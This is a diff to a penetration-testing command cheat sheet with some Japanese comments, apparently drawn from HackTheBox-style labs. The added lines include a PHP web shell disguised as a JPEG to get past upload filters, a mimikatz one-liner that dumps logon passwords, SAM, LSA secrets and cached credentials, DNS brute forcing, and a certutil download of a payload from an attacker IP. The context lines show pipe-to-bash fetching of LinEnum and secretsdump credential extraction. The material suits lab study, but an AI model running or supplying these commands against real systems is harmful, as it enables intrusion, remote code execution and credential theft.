@@ -8,6 +8,7 @@
 - SSTI \(Server-Side Template Injection\)
 - port scan
 - kubeletctl
+- file upload bypass tech
 - ffuf
 - sqlmap
 - Powershell
@@ -63,6 +64,7 @@ tar -jcvf xxxx.tar.bz2 directory
 tar -Jcvf xxxx.tar.xz directory
 tar -cvf xxxx.tar directory
 zip -r xxxx.zip directory
+gzip *ファイル名*
 
 # 解凍
 tar -zxvf xxxx.tar.gz
@@ -70,6 +72,7 @@ tar -jxvf xxxx.tar.bz2
 tar -Jxvf xxxx.tar.xz
 tar -xvf xxxx.tar
 unzip xxxx.zip
+gzip -d *ファイル名*.gz
 
 echo "content" | base64 -d > out
 file out
@@ -88,6 +91,8 @@ curl http://10.10.16.17/LinEnum.sh | bash
 nslookup 10.10.10.13 10.10.10.13(DNS Server addr)
 # 13.10.10.10.in-addr.arpa	name = ns1.cronos.htb.
 
+dig any victim.com @<DNS_IP>
+
 dig axfr @10.10.10.13 cronos.htb
 # ; <<>> DiG 9.19.21-1-Debian <<>> axfr @10.10.10.13 cronos.htb
 # ; (1 server found)
@@ -104,6 +109,8 @@ dig axfr @10.10.10.13 cronos.htb
 # ;; WHEN: Sat Jun 01 18:56:18 JST 2024
 # ;; XFR size: 7 records (messages 1, bytes 203)
 
+# brute force
+dnsenum --dnsserver <DNS_IP> --enum -p 0 -s 0 -o subdomains.txt -f <WORDLIST> <DOMAIN>
 ```
 
 # ssh
@@ -200,16 +207,25 @@ kubectl --token=$token --certificate-authority=ca.cert --server=https://10.10.11
 kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:8443 get pods
 ```
 
+# file upload bypass tech
+```shell
+echo 'FFD8FFDB' | xxd -r -p > webshell.php.jpg
+echo '<?=`$_GET[0]`?>' >> webshell.php.jpg
+```
+
 # ffuf
 ```shell
 # サブドメインの列挙
 ffuf -t 200 -u http://devvortex.htb -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt:FUZZ -H 'Host: FUZZ.devvortex.htb' -fw 4
+ffuf -u http://corporate.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host:FUZZ.corporate.htb" -t 200 -fw 5
 
 # ブルートフォース
 ffuf -request r.txt -request-proto http -w /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-10000.txt:PASSFUZZ -mc 200 -t 200
 
 # burp intruderの代用
 ffuf -u http://10.10.10.93/transfer.aspx -w extensions.txt -request request.txt -fw 94
+
+
 ```
 
 # sqlmap
@@ -232,7 +248,7 @@ Get-ADPrincipalGroupMembership -Identity fsmith | Select-Object Name
 
 # powershell_download_file
 ```shell
-certutil -urlcache -split -f http://10.10.14.26/exploit.exe exploit.exe
+certutil -urlcache -split -f http://10.10.14.2/payload2.exe payload2.exe
 bitsadmin /transfer transfName /priority high http://10.10.14.26/exploit.exe exploit.exe
 powershell "(new-object system.net.webclient).downloadfile('http://attackerIP:PORT/exploit.exe','exploit.exe')"
 (New-Object Net.WebClient).DownloadFile("http://10.10.14.26/exploit.exe","exploit.exe")
@@ -370,7 +386,7 @@ GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN.FULL>/<USERNAME> -outputfile hash
 ```shell
 impacket-secretsdump -security path/to/security -system path/to/system -ntds path/to/ntds.dit
 impacket-secretsdump -sam SAM -system SYSTEM LOCAL
-impakcet-secretsdump spookysec.local\backup:password123@spookysec.local
+impakcet-secretsdump spookysec.local/backup:password123@spookysec.local
 ```
 
 ## impakcet-psexec
@@ -393,6 +409,9 @@ Invoke-Mimikatz -Command '"lsadump::dcsync /all"'
 
 # mimikatz
 ```bat
+rem one liner
+mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
+
 rem lsa保護を無効にするドライバをインポートして無効化
 mimikatz # !+
 mimikatz # !processprotect /process:lsass.exe /remove
@@ -430,6 +449,8 @@ mimikatz # crypto::capi
 mimikatz # crypto::cng
 rem 証明書キーのエクスポート
 mimikatz # crypto::certificates /systemstore:local_machine /export
+
+
 ```
 
 # ForgeCert
